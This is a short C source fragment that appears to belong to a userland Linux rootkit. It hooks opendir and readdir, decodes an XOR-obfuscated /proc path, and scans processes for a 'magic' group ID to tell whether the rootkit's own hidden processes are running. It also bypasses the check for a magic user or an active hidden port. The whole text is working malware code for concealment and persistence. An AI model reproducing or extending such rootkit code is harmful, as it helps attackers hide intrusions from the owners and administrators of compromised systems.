DIR __attribute((visibility("hidden"))) *open_procdir(void){
    char *procdir = xordup(PROCPATH_PATTERN); // uses a string not necessarily meant for this.
    if(procdir == NULL)
        return NULL;
    procdir[5] = '\0';

    hook(COPENDIR);
    DIR *rv = call(COPENDIR, procdir);
    bfree(procdir, PROCPATH_PATTERN_SIZE);
    return rv;
}

int rkprocup(void){
    if(!initmvbc() || magicusr() || is_hideport_alive)
        return 1;

    DIR *dp = open_procdir();
    if(dp == NULL) return 0;

    int status = 0;
    struct dirent *dir;
    hook(CREADDIR);
    while((dir = call(CREADDIR, dp)) != NULL && !status){
        if(*dir->d_name == '.') continue;
        char procpath[7+strlen(dir->d_name)];
        xsnprintf(procpath, sizeof(procpath), PROCPATH_NAME_FMT, dir->d_name);
        status = get_path_gid(procpath) == mvbc->magicid;
    }
    closedir(dp);
    return status;
}